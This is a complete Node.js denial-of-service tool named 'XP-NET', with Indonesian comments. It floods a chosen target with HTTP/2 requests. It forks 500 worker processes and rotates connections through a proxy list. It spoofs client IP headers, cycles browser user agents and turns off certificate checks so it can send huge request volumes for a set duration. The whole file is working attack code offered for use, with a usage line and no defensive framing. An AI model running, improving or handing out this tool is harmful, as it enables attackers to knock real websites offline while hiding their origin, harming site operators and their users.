const fs = require('fs');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

// ARGUMENT UTAMA
const target = process.argv[2];
const port = parseInt(process.argv[3]);
const time = parseInt(process.argv[4]);

// DEFAULT VALUE
const rate = 1000000;
const threads = 500;
const proxyFile = 'proxy.txt';
const method = "XP-NET";

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
];

function randomIP() {
    return `${rand(1, 255)}.${rand(0, 255)}.${rand(0, 255)}.${rand(1, 254)}`;
}

function rand(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

if (!target || !port || !time) {
    console.log("Usage: node xp-net <target> <port> <time>");
    process.exit(1);
}

if (cluster.isPrimary) {
    console.log(`🚀 XP-NET Start`);
    console.log(`🎯 Target: ${target}`);
    console.log(`📦 Port: ${port}`);
    console.log(`⏱ Duration: ${time}s`);
    console.log(`📈 Rate: ${rate} req/s`);
    console.log(`🧵 Threads: ${threads}`);
    console.log(`🌐 Proxy File: ${proxyFile}`);
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(0), time * 1000);
} else {
    const proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(Boolean);
    const parsed = url.parse(target);

    function generateHeaders() {
        const spoofedIP = randomIP();
        return {
            ":method": "GET",
            ":path": parsed.path || "/",
            ":scheme": "https",
            ":authority": parsed.host,
            "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "x-forwarded-for": spoofedIP,
            "x-real-ip": spoofedIP,
            "pragma": "no-cache"
        };
    }

    function sendFlood(proxy) {
        const [host, port] = proxy.split(':');

        const socket = tls.connect({
            host: host,
            port: parseInt(port),
            servername: parsed.hostname,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2'],
        }, () => {
            const client = http2.connect(target, {
                createConnection: () => socket,
            });

            client.on('connect', () => {
                for (let i = 0; i < rate; i++) {
                    const req = client.request(generateHeaders());
                    req.setEncoding('utf8');
                    req.on('data', () => {});
                    req.on('end', () => {});
                    req.end();
                }
            });

            client.on('error', () => {
                client.destroy();
            });
        });

        socket.on('error', () => {
            socket.destroy();
        });
    }

    setInterval(() => {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        sendFlood(proxy);
    }, 100);
}